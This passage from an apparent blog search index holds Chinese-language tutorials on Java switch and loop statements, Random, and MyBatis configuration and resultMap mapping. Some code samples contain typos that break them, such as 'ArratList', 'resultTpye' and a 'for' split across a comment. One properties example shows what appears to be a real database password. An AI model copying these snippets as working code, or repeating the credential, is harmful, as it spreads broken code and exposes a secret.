class="attr">javaType</span>=<span class="string">&quot;ArratList&quot;</span> <span class="attr">ofType</span>=<span class="string">&quot;Student&quot;</span> <span class="attr">select</span>=<span class="string">get</span>&quot;<span class="attr">getStudentByTeacherId</span>&quot; <span class="attr">column</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getStudentByTeacherId&quot;</span> <span class="attr">resultTpye</span>=<span class="string">&quot;Student&quot;</span>&gt;</span></span><br><span class="line">  select * from student where tid = #&#123;tid&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>association 多对一</p></li><li><p>collection 一对多</p></li><li><p>javaType &amp; ofTpye</p><ul><li>JavaType 用来指定实体类中属性的类型</li><li>ofType 用来指定映射到List或者集合中的pojo类型 泛型中的约束类型</li></ul></li></ul></li></ul><hr><h1 id="动态SQL"><a href="#动态SQL" class="headerlink" title="动态SQL"></a>动态SQL</h1>]]></content>
      
      
      <categories>
          
          <category> mybatis框架 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据存储框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaSwitch和循环语句</title>
      <link href="/2021/11/04/switch%E5%92%8C%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5/"/>
      <url>/2021/11/04/switch%E5%92%8C%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5/</url>
      
        <content type="html"><![CDATA[<center> <h1>Switch和循环语句</h1></center><h1 id="switch语句结构"><a href="#switch语句结构" class="headerlink" title="switch语句结构"></a>switch语句结构</h1><ul><li><p>格式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (表达式) &#123; </span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>: </span><br><span class="line">    语句体<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>: </span><br><span class="line">    语句体<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    ... </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    语句体n+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><h2 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h2><ol><li><p>首先计算出表达式的值</p></li><li><p>其次，和case依次比较，一旦有对应的值，就会执行相应的语句，在执行的过程中，遇到break就会结束</p></li><li><p>最后，如果所有的case都和表达式的值不匹配，就会执行default语句体部分，然后程序结束掉</p><p><code>如果switch中得case，没有对应break的话，则会出现case穿透的现象</code></p><blockquote><p>case穿透就是不结束语句直接去判断下一条语句</p></blockquote></li></ol></li></ul><hr><h1 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h1><ul><li><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><ul><li><p>循环语句可以在满足循环条件的情况下，反复执行某一段代码，这段被重复执行的代码被称为循环体语句，当反复 执行这个循环体时，需要在合适的时候把循环判断条件修改为false，从而结束循环，否则循环将一直执行下去，形成死循环</p></li><li><p>for循环格式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (初始化语句;条件判断语句;条件控制语句) &#123;</span><br><span class="line">  循环体语句; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ul><li><p>格式解释：</p><ul><li>初始化语句： 用于表示循环开启时的起始状态，简单说就是循环开始的时候什么样</li><li>条件判断语句：用于表示循环反复执行的条件，简单说就是判断循环是否能一</li><li>循环体语句： 用于表示循环反复执行的内容，简单说就是循环反复执行的事情直执行下去</li><li>条件控制语句：用于表示循环执行中每次变化的内容，简单说就是控制循环是否能执行下去</li></ul></li><li><p>执行流程</p><ol><li>执行初始化语句</li><li>执行条件判断语句，看其结果是true还是false<ol><li>如果是false，循环结束</li><li>如果是true，继续执行</li></ol></li><li>执行循环体语句</li><li>执行条件控制语句</li><li>回到2继续</li></ol></li></ul></blockquote></li></ul></li></ul><hr><h1 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h1><ul><li><h2 id="while循环完整格式"><a href="#while循环完整格式" class="headerlink" title="while循环完整格式"></a>while循环完整格式</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">初始化语句; </span><br><span class="line"><span class="keyword">while</span> (条件判断语句) &#123;</span><br><span class="line">  循环体语句; 条件控制语句; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><h2 id="while循环执行流程"><a href="#while循环执行流程" class="headerlink" title="while循环执行流程"></a>while循环执行流程</h2><ol><li>执行初始化语句</li><li>执行条件判断语句，看其结果是true还是false<ol><li>如果是false，循环结束</li><li>如果是true，继续执行</li></ol></li><li>执行循环体语句</li><li>执行条件控制语句</li><li>回到2继续</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WhileDemo</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//需求：在控制台输出5次&quot;HelloWorld&quot; </span></span><br><span class="line">    <span class="comment">//for循环实现 </span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123; </span><br><span class="line">      System.out.println(<span class="string">&quot;HelloWorld&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">&quot;--------&quot;</span>); </span><br><span class="line">    <span class="comment">//while循环实现 </span></span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">1</span>; <span class="keyword">while</span>(j&lt;=<span class="number">5</span>) &#123; </span><br><span class="line">      System.out.println(<span class="string">&quot;HelloWorld&quot;</span>); </span><br><span class="line">      j++; </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><hr><h1 id="do…while循环结构"><a href="#do…while循环结构" class="headerlink" title="do…while循环结构"></a>do…while循环结构</h1><ul><li><h2 id="完整格式"><a href="#完整格式" class="headerlink" title="完整格式"></a>完整格式</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">初始化语句;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  循环体语句;</span><br><span class="line">  条件控制语句; </span><br><span class="line">&#125;<span class="keyword">while</span>(条件判断语句);</span><br></pre></td></tr></table></figure></li><li><h2 id="执行流程-1"><a href="#执行流程-1" class="headerlink" title="执行流程"></a>执行流程</h2><ol><li>执行初始化语句</li><li>执行循环体语句</li><li>执行条件控制语句</li><li>执行条件判断语句，看其结果是true还是false<ol><li>如果是false，循环结束</li><li>如果是true，继续执行</li></ol></li><li>回到2继续</li></ol></li><li><p>示例代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DoWhileDemo</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123; </span><br><span class="line">    <span class="comment">//需求：在控制台输出5次&quot;HelloWorld&quot; </span></span><br><span class="line">    <span class="comment">//for循环实现 f</span></span><br><span class="line">    or(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123; </span><br><span class="line">      System.out.println(<span class="string">&quot;HelloWorld&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">&quot;--------&quot;</span>); </span><br><span class="line">    <span class="comment">//do...while循环实现 </span></span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">1</span>; <span class="keyword">do</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;HelloWorld&quot;</span>); </span><br><span class="line">      j++;</span><br><span class="line">    &#125;<span class="keyword">while</span>(j&lt;=<span class="number">5</span>); </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><hr><h1 id="三种循环的区别"><a href="#三种循环的区别" class="headerlink" title="三种循环的区别"></a>三种循环的区别</h1><ul><li><h2 id="三种循环的区别-1"><a href="#三种循环的区别-1" class="headerlink" title="三种循环的区别"></a>三种循环的区别</h2><ul><li>for循环和while循环先判断条件是否成立，然后决定是否执行循环体（先判断后执行）</li><li>do…while循环先执行一次循环体，然后判断条件是否成立，是否继续执行循环体（先执行后判断）</li></ul></li><li><h2 id="for循环和while的区别"><a href="#for循环和while的区别" class="headerlink" title="for循环和while的区别"></a>for循环和while的区别</h2><ul><li>条件控制语句所控制的自增变量，因为归属for循环的语法结构中，在for循环结束后，就不能再次被访问到了</li><li>条件控制语句所控制的自增变量，对于while循环来说不归属其语法结构中，在while循环结束后，该变量还可以继续使用</li></ul></li><li><h2 id="死循环（无限循环）的三种格式"><a href="#死循环（无限循环）的三种格式" class="headerlink" title="死循环（无限循环）的三种格式"></a>死循环（无限循环）的三种格式</h2><ol><li> for(;;){}</li><li>while(true){}</li><li>do {} while(true);</li></ol></li></ul><hr><h1 id="跳转控制语句"><a href="#跳转控制语句" class="headerlink" title="跳转控制语句"></a>跳转控制语句</h1><ul><li>跳转控制语句（break）<ul><li>跳出循环，结束循环</li></ul></li><li>跳转控制语句（continue）<ul><li>跳过本次循环，继续下次循环</li></ul></li><li><code>continue只能在循环中进行使用</code></li></ul><hr><h1 id="循环嵌套"><a href="#循环嵌套" class="headerlink" title="循环嵌套"></a>循环嵌套</h1><ul><li><p>循环嵌套概述：在循环中，继续定义循环</p></li><li><p>示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123; </span><br><span class="line">  <span class="comment">//外循环控制小时的范围，内循环控制分钟的范围 </span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> hour = <span class="number">0</span>; hour &lt; <span class="number">24</span>; hour++) &#123; </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> minute = <span class="number">0</span>; minute &lt; <span class="number">60</span>; minute++) &#123; </span><br><span class="line">      System.out.println(hour + <span class="string">&quot;时&quot;</span> + minute + <span class="string">&quot;分&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">&quot;--------&quot;</span>); </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ul><li>整个内循环，就是外循环的一个循环体，内部循环体没有执行完毕，外循环是不会继续向下执行的</li><li>外循环执行一次，内循环执行一圈</li></ul></blockquote></li></ul><hr><h1 id="Random"><a href="#Random" class="headerlink" title="Random"></a>Random</h1><ul><li><h2 id="Random产生随机数"><a href="#Random产生随机数" class="headerlink" title="Random产生随机数"></a>Random产生随机数</h2></li><li><p>Random类似Scanner，也是Java提供好的API，内部提供了产生随机数的功能</p><ul><li>API可以理解为Java已经写好的代码</li></ul></li><li><h2 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h2><ol><li><p>导包</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br></pre></td></tr></table></figure></li><li><p>创建对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Random r = <span class="keyword">new</span> Random();</span><br></pre></td></tr></table></figure></li><li><p>产生随机数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> num = r.nextInt(<span class="number">10</span>);</span><br></pre></td></tr></table></figure><blockquote><p> 10代表的是一个范围，如果括号写10，产生的随机数就是0-9，括号写20，参数的随机数则是0-19</p></blockquote></li></ol></li><li><p>示例</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RandomDemo</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123; </span><br><span class="line">    <span class="comment">//创建对象 </span></span><br><span class="line">    Random r = <span class="keyword">new</span> Random(); </span><br><span class="line">    <span class="comment">//用循环获取10个随机数 </span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++) &#123; </span><br><span class="line">      <span class="comment">//获取随机数 </span></span><br><span class="line">      <span class="keyword">int</span> number = r.nextInt(<span class="number">10</span>); </span><br><span class="line">      System.out.println(<span class="string">&quot;number:&quot;</span> + number); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//需求：获取一个1-100之间的随机数 </span></span><br><span class="line">    <span class="keyword">int</span> x = r.nextInt(<span class="number">100</span>) + <span class="number">1</span>; </span><br><span class="line">    System.out.println(x); </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mybatis入门(三)</title>
      <link href="/2021/11/04/Mybatis%E5%85%A5%E9%97%A8(%E4%B8%89)/"/>
      <url>/2021/11/04/Mybatis%E5%85%A5%E9%97%A8(%E4%B8%89)/</url>
      
        <content type="html"><![CDATA[<center><h1>核心配置文件</h1></center><h1 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h1><h2 id="configuration配置"><a href="#configuration配置" class="headerlink" title="configuration配置"></a>configuration配置</h2><ul><li>配置文档的顶层结构<ul><li>properties属性</li><li>settings设置</li><li>typeAliases类型别名</li><li>typeHandlers类型处理器</li><li>objectFactory对象工厂</li><li>plugins插件</li><li>environments环境配置<ul><li>environment环境变量<ul><li>transactionManager事物管理器</li><li>dataSource数据源</li></ul></li><li>databaseldProvider数据库厂标识</li><li>mapper映射器</li></ul></li></ul></li></ul><hr><h2 id="配置环境-evironments"><a href="#配置环境-evironments" class="headerlink" title="配置环境(evironments)"></a>配置环境(evironments)</h2><ul><li>Mybatis 可以配置成适应多种环境<ul><li>即使可以配置多个环境，但每个SqlSessionFactory实例只能选者一种环境</li></ul></li><li>Mybatis默认的事物管理器是 jdbc， 连接池: POOLED</li></ul><h2 id="属性-properties"><a href="#属性-properties" class="headerlink" title="属性(properties)"></a>属性(properties)</h2><ul><li><p>我们可以通关properties属性来实现应用配置文件</p><ul><li><p>resources文件夹中编写peoperties配置文件</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">jdbc.driver</span> = <span class="string">com.mysql.jdbc.Driver</span></span><br><span class="line"><span class="meta">jdbc.url</span> = <span class="string">jdbc:mysql://localhost:3307/mybatis?userSSL=true&amp;amp;userUnicode&amp;amp;characterEncoding=utf-8</span></span><br><span class="line"><span class="meta">jdbc.user</span> = <span class="string">root</span></span><br><span class="line"><span class="meta">jdbc.password</span> = <span class="string">gwl2003.520</span></span><br></pre></td></tr></table></figure></li><li><p>通过properties标签引入配置文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span> <span class="attr">resource</span>=<span class="string">&quot;jdbc.properties&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><hr><h2 id="别名-typeAliases"><a href="#别名-typeAliases" class="headerlink" title="别名(typeAliases)"></a>别名(typeAliases)</h2><ul><li><p>类型别名是为java类型设置一个短的名字</p></li><li><p>存在的意义仅在于用来减少完全限定名的沉余 </p></li><li><p><code>类使用别名后，原来的类名不能用，全部都得换</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--    给实体类起别名--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">typeAlias</span> <span class="attr">type</span>=<span class="string">&quot;com.gwl.pojo.User&quot;</span> <span class="attr">alias</span>=<span class="string">&quot;user&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>也可以指定一个包名，Mybatis会在包名下搜索需要的JavaBean</p><ul><li><p>扫描实体类的包，它的默认别名就为这个类的类名首写字母</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;typeAlias type=&quot;com.gwl.pojo.User&quot; alias=&quot;user&quot;/&gt;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;com.gwl.pojo&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>实体类比较少的时候使用第一种方式， 如果实体类比较多的话推荐使用第二种</p><ul><li><p>第一种可以自定义别名， 第二种不行，如果非要修改需要在实体类上增加注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//别名注解</span></span><br><span class="line"><span class="meta">@Alias(&quot;hello&quot;)</span></span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>下面是一些为常见的 Java 类型内建的类型别名。它们都是不区分大小写的，注意，为了应对原始类型的命名重复，采取了特殊的命名风格</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202110081553921.png"></p></li></ul><hr><h2 id="设置-sttings"><a href="#设置-sttings" class="headerlink" title="设置(sttings)"></a>设置(sttings)</h2><p>这是mybatis中重要的调整设置, 它会改变mybatis的运行行为</p><p>日志的实现</p><p><img src="https://gitee.com/airgwl/upic/raw/master/img/image-20211008161107186.png" alt="image-20211008161107186"></p><p>缓存和懒加载</p><p>![image-20211008161224925](/Users/gwl/Library/Application Support/typora-user-images/image-20211008161224925.png)</p><p>一个配置完整的 settings 元素的示例如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;cacheEnabled&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;lazyLoadingEnabled&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;multipleResultSetsEnabled&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;useColumnLabel&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;useGeneratedKeys&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;autoMappingBehavior&quot;</span> <span class="attr">value</span>=<span class="string">&quot;PARTIAL&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;autoMappingUnknownColumnBehavior&quot;</span> <span class="attr">value</span>=<span class="string">&quot;WARNING&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;defaultExecutorType&quot;</span> <span class="attr">value</span>=<span class="string">&quot;SIMPLE&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;defaultStatementTimeout&quot;</span> <span class="attr">value</span>=<span class="string">&quot;25&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;defaultFetchSize&quot;</span> <span class="attr">value</span>=<span class="string">&quot;100&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;safeRowBoundsEnabled&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;mapUnderscoreToCamelCase&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;localCacheScope&quot;</span> <span class="attr">value</span>=<span class="string">&quot;SESSION&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;jdbcTypeForNull&quot;</span> <span class="attr">value</span>=<span class="string">&quot;OTHER&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;lazyLoadTriggerMethods&quot;</span> <span class="attr">value</span>=<span class="string">&quot;equals,clone,hashCode,toString&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="其他配置"><a href="#其他配置" class="headerlink" title="其他配置"></a>其他配置</h2><ul><li><p>typerHandlers(类处理器)</p></li><li><p>objectFactory(对象工厂)</p></li><li><p>plugins插件</p><ul><li>mybatis-generator-core</li><li>mybatis-plus</li><li>通用mapper</li></ul></li></ul><h2 id="映射器"><a href="#映射器" class="headerlink" title="映射器"></a>映射器</h2><ul><li><p>MapperRegistry: 注册绑定我们的Mapper文件</p><ul><li>方式一</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;mybatis-user-config.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>方式二:使用class文件绑定注册</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">class</span>=<span class="string">&quot;com.gwl.mapper.UserMapper&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><ul><li>方式二注意点:<ul><li>接口和他的mapper配置文件必须同名</li><li>接口和他的mapper配置文件必须要在同一包下</li></ul></li></ul></blockquote><ul><li><p>方式三：使用扫描包进行注入绑定</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;mapper resource=&quot;mybatis-user-config.xml&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;mapper class=&quot;com.gwl.mapper.UserMapper&quot;/&gt;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;com.gwl.mapper.UserMapper&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><ul><li>方式二注意点:<ul><li>接口和他的mapper配置文件必须同名</li><li>接口和他的mapper配置文件必须要在同一包下</li></ul></li></ul></blockquote></li></ul></li></ul><hr><h1 id="ResultMap结果集映射"><a href="#ResultMap结果集映射" class="headerlink" title="ResultMap结果集映射"></a>ResultMap结果集映射</h1><ul><li><p><code>resultMap</code> 元素是 MyBatis 中最重要最强大的元素。</p></li><li><p>当实体类中的字段名和数据库的字段名不匹配时不用resultMap是这样的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectUsers&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">  select</span><br><span class="line">    user_id             as &quot;id&quot;,</span><br><span class="line">    user_name           as &quot;userName&quot;,</span><br><span class="line">    hashed_password     as &quot;hashedPassword&quot;</span><br><span class="line">  from some_table</span><br><span class="line">  where id = #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>当使用resultMap时</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--resultMap的实体类型--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;userResultMap&quot;</span> <span class="attr">type</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">  <span 